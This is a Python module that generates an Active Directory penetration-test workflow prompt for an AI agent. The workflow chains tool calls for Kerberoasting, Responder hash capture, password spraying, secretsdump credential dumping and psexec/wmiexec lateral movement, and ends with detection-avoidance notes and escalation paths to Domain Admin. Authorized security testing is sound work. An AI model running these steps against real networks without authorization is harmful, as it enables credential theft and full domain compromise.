"""Active Directory assessment prompts."""

from __future__ import annotations


def ad_assessment(
    target: str,
    domain: str,
    credentials: str = "none",
) -> str:
    """Active Directory penetration test workflow.

    Args:
        target: Domain Controller IP or hostname.
        domain: Active Directory domain name (e.g. corp.local).
        credentials: Authentication level — none (null session), user (low-priv user), admin (domain admin).
    """
    auth_steps = ""
    if credentials in ("user", "admin"):
        auth_steps = f"""
## Phase 3 — Authenticated Enumeration
5. `nxc_enum(target="{target}", protocol="ldap", domain="{domain}", username="...", password="...")` — LDAP enumeration
6. `impacket_kerberoast(target="{target}", domain="{domain}", username="...", password="...")` — Kerberoasting (Event ID 4769)
7. `nxc_enum(target="{target}", protocol="smb", modules=["spider_plus"])` — SMB share spidering
8. `smbmap_scan(target="{target}", domain="{domain}", username="...", password="...")` — detailed share permissions (READ/WRITE per share)
9. `bloodhound_collect(target="{target}", domain="{domain}", username="...", password="...", collection_method="All")` — AD attack path mapping
   - Review: shortest paths to Domain Admin, Kerberoastable accounts, AS-REP Roastable, ACL abuse paths

## Phase 3b — LLMNR/NBT-NS Poisoning (Internal Network Only)
10. `responder_capture(interface="eth0", analyze_only=True, capture_duration=30)` — analyze first (non-disruptive)
    - If safe to proceed: `responder_capture(interface="eth0", analyze_only=False, capture_duration=60)` — capture NTLMv2 hashes
    - Crack captured hashes: `hash_crack(hash="<NTLMv2-hash>", hash_type="netntlmv2")`
    - ⚠️ Disruptive — coordinate with client before enabling poisoning"""

    post_exploitation = ""
    if credentials == "admin":
        post_exploitation = f"""
## Phase 5b — Post-Exploitation / Lateral Movement (Requires explicit authorization)
13. Credential dump:
    `impacket_secretsdump(target="{target}", domain="{domain}", username="...", password="...")` — SAM/NTDS/LSA secrets
14. Remote execution via SMB (SYSTEM-level):
    `impacket_psexec(target="<lateral-target>", domain="{domain}", username="...", password="...", command="whoami /all")`
15. Stealth remote execution via WMI (no service creation, lower footprint):
    `impacket_wmiexec(target="<lateral-target>", domain="{domain}", username="...", password="...", command="whoami /all")`
16. SMB share navigation:
    `impacket_smbclient(target="{target}", domain="{domain}", username="...", action="list", share="SYSVOL")`"""

    vuln_step = "10" if credentials == "none" else "11"
    spray_step = "11" if credentials == "none" else "12"
    crack_step = "12" if credentials == "none" else "13"

    return f"""# Active Directory Assessment: {domain} ({target})

## Target: {target} | Domain: {domain} | Auth: {credentials}

## Phase 1 — Network Discovery
1. `nmap_scan(target="{target}", ports="88,135,139,389,445,464,593,636,3268,3389", scan_type="version")` — DC port scan
2. `dns_enumerate(domain="{domain}")` — DNS records, SRV records for AD services

## Phase 2 — Unauthenticated Enumeration
3. `enum4linux_scan(target="{target}")` — null session SMB enumeration (users, shares, password policy)
4. `nxc_enum(target="{target}", protocol="smb")` — SMB signing, OS version, hostname
{auth_steps}

## Phase 4 — Vulnerability Assessment
{vuln_step}. Check for classic AD vulnerabilities:
   - MS17-010 (EternalBlue): `nmap_scan(target="{target}", scripts="smb-vuln-ms17-010")`
   - PrintNightmare: `nmap_scan(target="{target}", scripts="smb-vuln-cve-2021-1675")`
   - ZeroLogon (CVE-2020-1472): `cve_lookup(cve_id="CVE-2020-1472")`

## Phase 5 — Credential Attacks
{spray_step}. Password spraying (LOW AND SLOW — check lockout policy first!):
   `hydra_attack(target="{target}", service="smb", userlist="/tmp/users.txt", passlist="/tmp/passwords.txt")`
{crack_step}. Hash cracking from Kerberoasting / Responder: `hash_crack(hash="$krb5tgs$23$...", hash_type="krb5tgs")`
{post_exploitation}

## OPSEC Notes
- Check password lockout policy BEFORE any brute force attempt
- Kerberoasting IS logged by domain controllers (Event ID 4769)
- BloodHound collection generates significant LDAP traffic — expect detection in monitored environments
- responder_capture disrupts legitimate LLMNR/NBT-NS resolution — coordinate with client before enabling
- Use timing delays between credential attempts to avoid lockout and detection
- Document every credential used for the final report

## Key AD Attack Paths (from BloodHound)
- Kerberoastable accounts (SPNs set on user accounts) → offline hash crack → lateral movement
- AS-REP Roasting (pre-auth disabled) → no initial credentials needed
- Password in description fields (visible in enum4linux output)
- Unconstrained delegation → capture TGT on victim visit
- AdminSDHolder abuse → persistence via protected ACL
- ACL abuse: WriteDACL, GenericAll, GenericWrite → escalation path to Domain Admin
- GPO abuse → code execution on all machines in targeted OU"""
